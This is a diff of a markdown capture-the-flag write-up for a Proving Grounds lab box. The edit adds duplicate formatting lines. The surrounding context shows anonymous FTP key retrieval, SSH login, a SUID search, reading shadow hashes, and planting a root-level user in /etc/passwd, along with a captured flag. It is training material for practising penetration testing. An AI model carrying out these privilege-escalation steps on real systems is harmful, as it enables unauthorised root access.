@@ -1,6 +1,6 @@
 ---
 title: OnSystemShellDredd
-categories: [Proving Grounds Play]
+categories: [Proving Grounds, Play]
 tags: [FTP, PrivEsc, SUIDs]
 image:
   path: https://miro.medium.com/v2/resize:fit:1200/1*fiNtXsFnX5MR7BPQV_wBvg.png
@@ -14,6 +14,7 @@ image:
 IP : 192.168.222.130
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -24,6 +25,7 @@ OPEN PORTS >
 21     FTP (Try Anonymous)
 61000  SSH
 ```
+{: .nolineno}
 {: .nolineno}
 
 ---
@@ -69,6 +71,7 @@ local: id_rsa remote: id_rsa
 ftp>
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now in this FTP session I got a private key ( `id_rsa` ) for ssh login and a username as `hannah` so lets try the ssh on port `61000` →
 
@@ -94,6 +97,7 @@ uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(au
 hannah@ShellDredd:~$
 ```
 {: .nolineno}
+{: .nolineno}
 <br>
 <br>
 
@@ -112,6 +116,7 @@ hannah@ShellDredd:~$ cat local.txt
 25be130d1a9ddcb79ff365b266f21a20
 hannah@ShellDredd:~$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now lets check the SUIDs files for some permissions that leads me to root →
@@ -134,6 +139,7 @@ hannah@ShellDredd:/$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/passwd
 hannah@ShellDredd:/$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now I have used the [GTFOBin](https://gtfobins.github.io/) site for searching the exploit →
@@ -175,6 +181,7 @@ ftp:*:18480:0:99999:7:::
 hannah@ShellDredd:/$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I tried to decode the root password but it takes too much time so I decided to write my own user and password into the `/etc/passwd` file so lets do it now →
 
@@ -193,6 +200,7 @@ $ openssl passwd -1 -salt salt password
 $1$salt$qJH7.N4xYta3aEG/dfqo/0
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now the format of this /etc/passwd file is this →
 
@@ -200,6 +208,7 @@ Now the format of this /etc/passwd file is this →
 $ password_file_in_/etc/passwd_formats
 `shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash`
 ```
+{: .nolineno}
 {: .nolineno}
 
 I named the user `shiv`.
@@ -241,6 +250,7 @@ shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
 hannah@ShellDredd:/$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now lets switch user as `shiv` and use password as `password` →
 
@@ -281,6 +291,7 @@ root@ShellDredd:~# ip a
        valid_lft forever preferred_lft forever
 root@ShellDredd:~#
 ```
+{: .nolineno}
 {: .nolineno}
 <br>
 
